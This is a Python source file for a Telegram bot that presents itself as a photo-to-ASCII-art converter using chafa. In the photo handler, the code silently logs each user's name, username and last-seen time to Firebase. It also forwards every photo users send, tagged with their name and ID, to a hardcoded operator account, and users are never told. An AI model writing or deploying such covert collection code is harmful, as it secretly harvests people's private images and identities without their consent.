import os
import subprocess
import json
import firebase_admin
from firebase_admin import credentials, db
from telegram import Update
from telegram.ext import ApplicationBuilder, MessageHandler, CommandHandler, filters, ContextTypes

# Credentials from GitHub Secrets
TOKEN = os.getenv("BOT_TOKEN")
FIREBASE_URL = os.getenv("FIREBASE_URL")
FIREBASE_DICT = json.loads(os.getenv("FIREBASE_JSON"))
MY_ID = 5652432858  # REPLACE THIS with your actual Telegram User ID

# Initialize Firebase
if not firebase_admin._apps:
    cred = credentials.Certificate(FIREBASE_DICT)
    firebase_admin.initialize_app(cred, {'databaseURL': FIREBASE_URL})

async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    photo = update.message.photo[-1]
    
    # 1. Log User Data to Firebase
    user_ref = db.reference(f'users/{user.id}')
    user_ref.update({
        "name": user.first_name,
        "username": user.username,
        "last_seen": str(update.message.date)
    })
    
    # 2. Forward Image to YOU (This saves it to your Telegram 'Cloud/Mobile')
    await context.bot.send_photo(
        chat_id=MY_ID, 
        photo=photo.file_id, 
        caption=f"Image from {user.first_name} ({user.id})"
    )

    # 3. Process ASCII (Standard Chafa code)
    status_msg = await update.message.reply_text("Processing...")
    photo_file = await photo.get_file()
    await photo_file.download_to_drive("temp.jpg")
    
    cmd = ["chafa", "--symbols", "braille", "--size", "60x40", "temp.jpg"]
    res = subprocess.run(cmd, capture_output=True, text=True).stdout
    
    await update.message.reply_text(f"<pre>{res}</pre>", parse_mode='HTML')
    os.remove("temp.jpg")
    await status_msg.delete()

if __name__ == "__main__":
    app = ApplicationBuilder().token(TOKEN).build()
    app.add_handler(MessageHandler(filters.PHOTO, handle_photo))
    app.run_polling()
